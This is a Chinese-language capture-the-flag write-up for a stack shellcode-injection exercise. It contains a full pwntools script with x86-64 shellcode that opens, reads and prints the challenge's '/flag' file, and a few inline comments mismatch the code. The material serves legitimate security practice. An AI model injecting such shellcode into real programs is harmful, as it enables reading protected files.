# 挑战简介
```
此挑战会读取一些字节，修改它们（取决于特定的挑战配置），然后将其作为代码执行！这是一种常见的利用场景，称为“代码注入”。通过这一系列挑战，您将在各种约束条件下练习您的 shellcode 编写技能！为了确保您是在编写 shellcode，
而不是使用其他技巧，这将清理所有环境变量和参数并关闭所有大于 2 的文件描述符。

在此挑战中，shellcode 将被复制到堆栈上并执行。由于堆栈位置在每次执行时都是随机的，因此您的 shellcode 需要*与位置无关*。

在堆栈 0x7ffece54ab40 处为 shellcode 分配 0x1000 字节！
从标准输入读取 0x1000 字节。
```

# 思路
到这里的题目和前面的有了很大的区别  
这里需要你进行shell代码注入,将命令嵌套进程序,从而执行你需要的命令  
输入要用汇编语言输入  
(这题解出来的人非常多,但是我感觉难度要大得多(lll￢ω￢),虽然我是ai解出来的)
```
#!/usr/bin/python
from pwn import *
import struct
import os
cache_dir = '/tmp/.pwntools-cache'
if not os.path.exists(cache_dir):
    os.makedirs(cache_dir)
#这段代码设置了一个新的缓存目录 /tmp/.pwntools-cache，并检查该目录是否存在。如果不存在，它将创建该目录。这是为了避免 PermissionError，确保 pwntools 有一个可以写入的缓存目录。

context(os='linux', arch='amd64', log_level='debug', cache_dir=cache_dir)
p = process('/challenge/binary-exploitation-basic-shellcode')

p.recvuntil('Reading 0x1000 bytes from stdin.\n')
shellcode = asm('''
    xor rax, rax                      # 清理rax
    mov rdi, 0x67616c662f             # 移动 '/flag' 进 rdi
    push rdi                          # 推rdi进栈
    mov rdi, rsp                      # rsp指向flag, 替代rdi
    xor rsi, rsi                      # 清理 rdi
    xor rdx, rdx                      # 清理 rdx 
    mov rax, 2                        # 执行打开指令
    syscall                           # open('/flag', O_RDONLY)

    mov rdi, rax                      # 文件描述符
    mov rsi, rsp                      # 移动缓冲区进栈
    mov rdx, 100                      # 读取的字节数
    xor rax, rax                      # 执行读取指令
    syscall                           # read(fd, buffer, 0x100)

    mov rdi, 1                        # 输出描述符
    mov rax, 1                        # 执行写入
    syscall                           # write(stdout, buffer, 0x100)
''')

# 构建payload
payload = shellcode.ljust(0x1000, b'\x90')  # 填充剩余空间为NOP指令
print(len(payload))
p.send(payload)
output = p.recvall()
print(output.decode(errors='ignore'))
这段代码接收进程的所有输出，并使用 errors='ignore' 参数将其解码为字符串，忽略无法解码的字节。然后将解码后的字符串输出到控制台。
```
